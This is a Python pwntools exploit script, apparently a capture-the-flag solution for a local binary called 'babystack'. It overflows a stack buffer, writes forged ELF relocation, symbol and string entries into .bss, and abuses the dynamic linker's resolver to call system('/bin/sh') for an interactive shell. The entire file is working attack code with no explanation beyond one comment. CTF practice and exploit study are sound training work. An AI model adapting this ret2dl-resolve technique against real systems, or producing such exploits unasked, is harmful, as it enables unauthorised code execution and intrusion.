from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')
bss = 0x804a020
dynstr = 0x804822c
dynsym = 0x80481cc
relplt = 0x80482b0

scanInput = p32(0x804843b)
resolve = p32(0x80482f0)

payload1_size = 43

# payload0 = b""
payload0 = b'0' * 44
payload0 += p32(elf.symbols['read'])
payload0 += scanInput
payload0 += p32(0x0)
payload0 += p32(bss)
payload0 += p32(payload1_size)

target.sendline(payload0)

dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (int(dynsym_offset) << 8) | 0x7

dynstr_index = (bss + 28) - dynstr

# payload1 = b""
payload1 = p32(elf.got['alarm'])       # at GOT entry address of alarm@libc will be placed libc (absolute) address of system@libc, because our goal is to pop a shell with system("/bin/sh")
payload1 += p32(r_info)
payload1 += p32(0x0)
payload1 += p32(dynstr_index)
payload1 += p32(0xde) * 3
payload1 += b"system\x00"
payload1 += b"/bin/sh\x00"
target.sendline(payload1)

binsh_bss_address = bss + 35
rel_plt_offset = bss - relplt

# payload2 = b""
payload2 = b'0' * 44
payload2 += p32(rel_plt_offset)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh_bss_address)
target.sendline(payload2)
target.interactive()
